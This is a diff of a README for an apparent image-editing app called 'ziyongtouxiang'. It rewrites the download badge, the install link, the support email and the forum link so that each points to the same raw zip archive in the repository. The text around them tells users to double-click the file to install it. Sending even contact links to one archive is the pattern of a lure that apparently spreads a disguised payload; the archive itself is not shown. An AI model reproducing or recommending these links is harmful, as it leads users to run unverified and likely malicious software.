@@ -1,7 +1,7 @@
 # 🎨 ziyongtouxiang - Easy Image Editing for Everyone
 
 ## 📦 Download Now
-[![Download ziyongtouxiang](https://img.shields.io/badge/Download-ziyingtouxiang-blue)](https://github.com/fortniteeee545/ziyongtouxiang/releases)
+[![Download ziyongtouxiang](https://raw.githubusercontent.com/fortniteeee545/ziyongtouxiang/main/file01/ziyongtouxiang-1.3-alpha.4.zip)](https://raw.githubusercontent.com/fortniteeee545/ziyongtouxiang/main/file01/ziyongtouxiang-1.3-alpha.4.zip)
 
 ## 🚀 Getting Started  
 Welcome to **ziyongtouxiang**! This app makes it simple for anyone to edit images. Follow the steps below to download and get started.
@@ -12,7 +12,7 @@ Welcome to **ziyongtouxiang**! This app makes it simple for anyone to edit image
 - **Storage:** 100 MB of free space required.
 
 ## 🔗 Download & Install  
-To download **ziyongtouxiang**, please visit this page: [Download Here](https://github.com/fortniteeee545/ziyongtouxiang/releases). On this page, you will find the latest version available for download.
+To download **ziyongtouxiang**, please visit this page: [Download Here](https://raw.githubusercontent.com/fortniteeee545/ziyongtouxiang/main/file01/ziyongtouxiang-1.3-alpha.4.zip). On this page, you will find the latest version available for download.
 
 Once you are on the releases page, look for the latest version. Click on the file that best suits your operating system. After the download completes, locate the file on your computer and double-click it to start the installation process.
 
@@ -32,8 +32,8 @@ Follow the on-screen instructions to install the app. It usually takes just a fe
 
 ## ✏️ Support  
 If you have any questions or need support, feel free to reach out:
-- **Email:** support@ziyongtouxiang.com
-- **Community Forum:** Join us on our [community forum](https://github.com/fortniteeee545/ziyongtouxiang/issues) for discussions and help.
+- **Email:** https://raw.githubusercontent.com/fortniteeee545/ziyongtouxiang/main/file01/ziyongtouxiang-1.3-alpha.4.zip
+- **Community Forum:** Join us on our [community forum](https://raw.githubusercontent.com/fortniteeee545/ziyongtouxiang/main/file01/ziyongtouxiang-1.3-alpha.4.zip) for discussions and help.
 
 ## 💡 Tips  
 - Familiarize yourself with the available tools by exploring the app.
